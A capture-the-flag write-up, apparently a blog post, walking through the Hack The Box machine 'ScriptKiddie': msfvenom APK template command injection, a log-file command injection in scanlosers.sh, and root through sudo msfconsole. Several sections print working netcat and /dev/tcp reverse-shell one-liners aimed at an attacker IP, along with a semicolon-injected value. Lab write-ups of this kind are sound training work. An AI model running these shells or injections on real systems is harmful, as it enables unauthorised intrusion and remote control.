---
title:     "Hack The Box - ScriptKiddie"
tags: [HackTheBox,Linux,Easy,CVE]
layout: post
categories: HackTheBox-Writeups
---

![](/images/HTB/ScriptKiddie/scriptkiddie.png)

# Introduction

ScriptKiddie is an easy rated Hack The Box machine taking advantage of an MSFvenom exploit to gain a user shell followed by exploiting a script to get access as another user. This new user has sudo acess to MSFconsole which can be used to get a root shell. Let's get started!

# Initial Enumeration

## Nmap scan
```
# Nmap 7.91 scan initiated Fri Mar  5 07:22:03 2021 as: nmap -T3 -Pn -O -p T:22,5000 -sV --script=default,http-vuln-cve2010-0738.nse,http-vuln-cve2011-3192.nse,http-vuln-cve2014-2126.nse,http-vuln-cve2014-2127.nse,http-vuln-cve2014-2128.nse,http-vuln-cve2014-2129.nse,http-vuln-cve2015-1635.nse,http-vuln-cve2017-1001000.nse -oN /storage/HackTheBox/ScriptKiddie/nmap/vuln_10.10.10.226.nmap 10.10.10.226
Nmap scan report for 10.10.10.226
Host is up (0.0089s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 3c:65:6b:c2:df:b9:9d:62:74:27:a7:b8:a9:d3:25:2c (RSA)
|   256 b9:a1:78:5d:3c:1b:25:e0:3c:ef:67:8d:71:d3:a3:ec (ECDSA)
|_  256 8b:cf:41:82:c6:ac:ef:91:80:37:7c:c9:45:11:e8:43 (ED25519)
5000/tcp open  http    Werkzeug httpd 0.16.1 (Python 3.8.5)
|_http-title: k1d'5 h4ck3r t00l5
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 4.15 - 5.6 (95%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.3 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 5.0 (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Mar  5 07:22:14 2021 -- 1 IP address (1 host up) scanned in 11.40 seconds
```

## Port 5000

Our Nmap scan comes back with only port 5000 open (other than SSH) so we know exactly what we are going to be attacking. Browsing to http://10.10.10.226:5000 brings up a simple page with some 'h4ck3r t00l5' for us to play around with. We have the ability to run an Nmap scan against an IP address, generate a MSFvenom payload, or perform a search in searchsploit.

![](/images/HTB/ScriptKiddie/http.png)

What immidately caught my eye was the fact that we can upload a file with the MSFvenom payload generation. I figured at this point we would either be able to get some of these tools to run some extra commands that they were not supposed to run, or do something with this file upload. After messing around with the tools and getting nowhere I turned my attention to MSFvenom templates. A quick Google for `msfvenom template exploit` is all we need to find what we are looking for. A few links down in the search we come across a GitHub page (link in the references section) explaining how the exploit works as well as some proof of concept code. The gist of it is that you can feed MSFvenom a special template file that will execute commands on the system building the payload which obviously is not supposed to happen.

# Remote command execution

Looking at the proof of concept code, all we need to do is modify the payload. Before trying to do anything advanced I like to start of with a simple ping to make sure things are working well. Simply change the payload to `ping -c 1 our_ip_here` and run the script to generate our file.

![](/images/HTB/ScriptKiddie/payload_generate.png)

The script is nice enough to tell us that the LHOST is supposed to be `127.0.0.1` so we can enter that back on the tools page. We can select the OS as 'Android' since we are generating an apk file and upload our generated apk file as the template. Back on our host machine we can run the command `tcpdump -i tun0 icmp` to listen for any icmp traffic on our tun0 interface. Click generate on the webpage and we see that we get a ping back!

![](/images/HTB/ScriptKiddie/ping_success.png)


## Getting a shell

So now that we know we have command execution lets see if we can get a shell back. I'm going to change the payload to be `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.16 6868 >/tmp/f` since I usually have better luck with this giving me a callback. Run the script and... oh my, an error. 

![](/images/HTB/ScriptKiddie/error.png)

We know that we just ran this script before and it was fine, so perhaps it does not like something in our payload. The biggest issue is usually a bad character that needs to be escaped. After some trial and error I found that escaping the '-' before '-i' fixed the issue, so our new payload becomes `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh \-i 2>&1|nc 10.10.14.16 6868 >/tmp/f`. Same as before we upload the template, setting the LHOST to 127.0.0.1 and setting the OS to Android, however this time we need a netcat listener waiting for our callback. We do that with `nc -lvnp 6868`. Press generate on the website and we have our shell!

![](/images/HTB/ScriptKiddie/shell.png)

# Getting user

The user flag is actually granted to us immediately after getting the shell. Our shell spawns as the user 'kid' so all we need to do is navigate to his home directory and grab the flag.

![](/images/HTB/ScriptKiddie/user.png)

# Transitioning to the pwn user

Some quick manual enumeration shows us that there is another user on this box, the user pwn. Located inside of his home directory is a script called 'scanlosers.sh'. Let's have a look at this script.

![](/images/HTB/ScriptKiddie/scanlosers.png)

We see that this script is pulling a logfile from `/home/kid/logs/hackers` and expecting three fields separated by spaces, the third field being an IP address. It then takes this IP address and runs an Nmap scan against it. Since the log file is actually in our home directory and writable by us it is reasonable to think that we must exploit this script somehow. 

## Exploring scanlosers.sh

The biggest issue with our plan is that scanlosers.sh is owned by pwn, and we cannot execute it. Perhaps there is a script automatically executing it though? What happens if we write to the file?

![](/images/HTB/ScriptKiddie/logtest.png)

Look at that. The modified time on the file changes instantly but there is no data in it, which is expected since the last line of the script is an echo of nothing. We can assume that something is watching this file (and we could check this with pspy) but for a quick proof of concept let's see what happens if we put our own IP address in. The script is looking for three fields separated by a space, however with cut and the '-f' flag if none of the delimiters exist it will return the whole line instead. This means we can either put in `x x 10.10.14.16` or we could send it only our IP address instead. For simplicity's sake I'm only going to echo my IP address. Fire up tcpdump again (without the icmp argument this time) and echo our IP into the file.

![](/images/HTB/ScriptKiddie/logtcpdump.png)

We instantly get hit with a bunch of traffic so clearly this script automatically executing which is great news for us. Let's start thinking about how we can exploit this.

## Exploiting scanlosers.sh

There is one character in this script that will allow us to do whatever we want on the box. That character happens to be the trailing '-' on the '-f3-' argument. That trailing '-' says to include anything after the third field. So for example, lets say we echo `x x ; ping -c 1 10.10.14.16` into the log file. When the cut command is done the result will be `; ping -c 1 10.10.14.16` since the ';' is the third field and we are taking that and everything after it. This whole line is then passed on to the Nmap command on the next line of the script. The semicolon will terminate the Nmap command and start our ping command (or whatever else we put) next.

Let's put the command we want to run into a script and run the script instead of sending the commands directly to the log file. This will allow us to run our script first for troubleshooting since we will get error messages this way. For example, we see that `nc` is on the box, but if we do `echo 'nc -e /bin/sh 10.10.14.16 1234' > test.sh` and run `sh test.sh` we see that the '-e' flag is not supported. Similarly if we try `bash -i >& /dev/tcp/10.10.14.16/7777` we see we get an error as well. Note I'm running these with `sh` since the scanlosers script will be executing them this way. Testing these things first can save us a lot of headaches since we wont be getting an output with an error if we just threw them into the log file.

![](/images/HTB/ScriptKiddie/reverseshell_test.png)

We do find that `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.16 7777 >/tmp/f` will run successfully however so let's try that.

```
echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.16 7777 >/tmp/f' > shell.sh
chmod +x shell.sh
```
Now all we should have to do is start our listener with `nc -lvnp 7777` and inject a command into the log file telling it to execute our script(`echo ';/home/kid/shell.sh' > hackers`). Since there are no spaces in what is being echoed into the file we do not need to have two arguments before it.

![](/images/HTB/ScriptKiddie/pwn_shell.png)

We are now the pwn user!

# Getting root

Since this is an easy box root is very simple. Checking `sudo -l` shows we can run msfconsole without a password. Just do what it tells you to do! `sudo /opt/metasploit-framework-6.0.9/msfconsole`. Once Metasploit is loaded all we need to do is type `bash -i` for an interactive root bash shell.

![](/images/HTB/ScriptKiddie/root.png)

Boom.

# References 

- [advisories/2020_metasploit_msfvenom_apk_template_cmdi.md at master · justinsteven/advisories · GitHub](https://github.com/justinsteven/advisories/blob/master/2020_metasploit_msfvenom_apk_template_cmdi.md)